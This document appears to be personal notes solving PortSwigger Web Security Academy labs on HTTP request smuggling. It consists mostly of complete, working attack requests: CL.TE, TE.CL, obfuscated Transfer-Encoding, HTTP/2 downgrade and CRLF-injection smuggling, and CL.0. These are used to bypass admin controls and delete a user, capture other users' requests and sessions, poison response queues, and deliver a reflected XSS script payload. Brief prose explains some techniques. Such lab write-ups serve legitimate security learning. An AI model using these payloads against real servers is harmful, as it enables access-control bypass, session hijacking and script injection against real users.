### HTTP request smuggling, basic CL.TE vulnerability
```http
POST / HTTP/1.1
Host: 0aa5006404ff4af7808d851000b80050.web-security-academy.net
Cookie: session=Kk8s672RLE4Ez2zYWTOuXTZ5DXVdtdUM
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="137", "Not/A)Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Content-Length: 8
Transfer-Encoding: chunked

0


G
```

### HTTP request smuggling, basic TE.CL vulnerability
```http
POST / HTTP/1.1
Host: 0a1800e10453781780123f050024005f.web-security-academy.net
Cookie: session=VLi94a6nr97fAC1uGcmNGrMv6WCSlPPG
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="137", "Not/A)Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive
Content-Length: 3
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

### HTTP request smuggling, obfuscating the TE header
```http
POST / HTTP/1.1
Host: 0ad8006804b1cb2281601b0700de003e.web-security-academy.net
Sec-Ch-Ua: "Chromium";v="137", "Not/A)Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Priority: u=0, i
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: cow

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

### HTTP request smuggling, confirming a CL.TE vulnerability via differential responses
```http
POST / HTTP/1.1
Host: 0adf00c903928b82807a5d3d003e00dc.web-security-academy.net
Cookie: session=Lr5X7DamZpmkyQBmCxdLfmgxGv1RM6k4
Sec-Ch-Ua: "Chromium";v="137", "Not/A)Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x
```

### HTTP request smuggling, confirming a TE.CL vulnerability via differential responses
```http
POST / HTTP/1.1
Host: 0add00ce03e6cbd8cdbde34f000a000a.web-security-academy.net
Sec-Ch-Ua: "Chromium";v="137", "Not/A)Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 4
Transfer-Encoding: chunked

5f
POST /40s4 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

### Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability
```http
POST / HTTP/1.1
Host: 0abc007203ea874d80010d9a00b4000c.web-security-academy.net
Cookie: session=tZPJhGFTkc14ZNneoaXvhXBHSc3zYjO8
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="137", "Not/A)Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Content-Length: 92
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Length: 10


x=
```

### Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability
```http
POST / HTTP/1.1
Host: 0abf006e049a127b80b6cb4800240046.web-security-academy.net
Cookie: session=opRHlKVRK5pI7gDFvoz6iS70JKd4CpZj
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="137", "Not/A)Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Content-Length: 4
Transfer-Encoding: chunked

66
POST /admin/delete?username=carlos HTTP/1.1
Host: localhost
X-Ignore: X
Content-Length: 15


x=1
0


```


### Exploiting HTTP request smuggling to reveal front-end request rewriting
```http
POST / HTTP/1.1
Host: 0ae700dc04869cf8810d6b9700510068.web-security-academy.net
Cookie: session=uDkY4ntORa7dTJpfL8ixoAy1o19HQi4b
Content-Length: 105
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0


POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 400


search=
```

```http
POST / HTTP/1.1
Host: 0ae700dc04869cf8810d6b9700510068.web-security-academy.net
Cookie: session=uDkY4ntORa7dTJpfL8ixoAy1o19HQi4b
Content-Length: 168
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0


GET /admin/delete?username=carlos HTTP/1.1
X-GwqAhd-Ip: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
Connection: close

x=1
```

### Exploiting HTTP request smuggling to capture other users' requests
```http
POST / HTTP/1.1
Host: 0a3400e304a00b5a81a40e6f00d90060.web-security-academy.net
Cookie: session=6MYApPH4i8fhaywLuQXAUhOO1ynYPx7A
Transfer-Encoding: chunked
Content-Length: 284

0


POST /post/comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Cookie: session=6MYApPH4i8fhaywLuQXAUhOO1ynYPx7A
Content-Length: 950

csrf=vEBWClscyPS08FSxfQQaE6SHKWiMYQCO&postId=7&name=asddaaa&email=fdsaf%40gmail.com&website=https%3A%2F%2Fgoogle.com&comment=
```

### Exploiting HTTP request smuggling to deliver reflected XSS
**Payload** :
```http
POST / HTTP/1.1
Host: 0aff00f503a4570484681fcf006b00b7.web-security-academy.net
Sec-Ch-Ua: "Not=A?Brand";v="24", "Chromium";v="140"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Content-Length: 87
Transfer-Encoding: chunked

0

GET /post?postId=7 HTTP/1.1
User-Agent: "><script>alert(1);</script>
X-Ignore: X
```

### H2.CL request smuggling
**Payload** :
```http
POST / HTTP/2
Host: 0a1c00e30400f24280ecc1d7009e00fa.web-security-academy.net
Sec-Ch-Ua: "Chromium";v="143", "Not A(Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Content-Length: 0

GET /resources HTTP/1.1
Host: exploit-0a3b00b60445f2ce807ec0ab01b80097.exploit-server.net
Content-Length: 5

x=1
```

### Response queue poisoning via H2.TE request smuggling
**Payload** :
```http
POST /asfd HTTP/2
Host: 0a51000c03cd50cc8201b5a600240008.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Cookie: session=K4td082v3lm1QjnoFU2j6nPJZhUAZ99Q
Transfer-Encoding: chunked

0

GET /asfd HTTP/1.1
Host: 0a51000c03cd50cc8201b5a600240008.web-security-academy.net


```
The objective of this lab is to get response from admin request while login, so what we need just spam the smuggled request until got victim response. Use Intruder to help spam
![[Pasted image 20260120064509.png]]


### HTTP/2 request smuggling via CRLF injection
**Payload** :
on the lab, frontend will delete header `Transfer-Encoding`, so we need to bypass it by add new header on burpsuite but the value contain `Bar\r\nTransfer-Encoding: chunked` which Transfer-Encoding won't detected as header, but the process will accept the `Transfer-Encoding`, then the smuggled request is search feature that will save history search, so the request of victim will saved to our history session

```http
POST / HTTP/2
Host: 0a2200af0393e0538387c838004f0030.web-security-academy.net
Sec-Ch-Ua-Mobile: ?0
Cookie: session=yR9yKGhYADrIHCNe7I12nqARmM3Khgol
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
X-Ignore: nore\r\nTransfer-Encoding: chunked

0

POST / HTTP/1.1
Host: 0a2200af0393e0538387c838004f0030.web-security-academy.net
Cookie: session=yR9yKGhYADrIHCNe7I12nqARmM3Khgol
Content-Length: 1000
Content-Type: application/x-www-form-urlencoded

search=asdfd
```
![[Pasted image 20260120072158.png]]

### HTTP/2 request splitting via CRLF injection
**Payload** :

So it basically using the same concept as before but, the CRLF Injection contain another request not `Transfer-Encoding` header, which we will wait the response from victim request
```http
GET /sadf HTTP/2
Host: 0a7c007f0395cee2860ee9e800690067.web-security-academy.net
Cookie: session=pi43LL0VddIRbnSAFJl01qI6h47V3KeX
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
X-Ignore: bar\r\n\r\nGET /x HTTP/1.1\r\nHost: 0a7c007f0395cee2860ee9e800690067.web-security-academy.net


```
![[Pasted image 20260120075401.png]]

### CL.0 request smuggling
**Payload** :
```http
POST /resources/images/blog.svg HTTP/2
Host: 0a6e001a043e74d286654d0800a5005f.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Connection: Keep-Alive
Content-Length: 55

GET /admin/delete?username=carlos HTTP/1.1
X-Ignore: x
```

On  CL.0 concept, backend will treat the request with `Content-Length: 0`, it means, that body request will treat as another request. but it required on the same connection (using header `Connection: Keep-Alive`, and send as group sequential single connection). So the process is look like this
**Frontend**
1. Send request (with body smuggled request)
2. Send normal request

**Backend**
1. Receive First Request (treat content length as 0)
2. Process smuggled request
3. Receive normal request, but it saved on X-Ignore: x
![[Pasted image 20260120094133.png]]
![[Pasted image 20260120094147.png]]
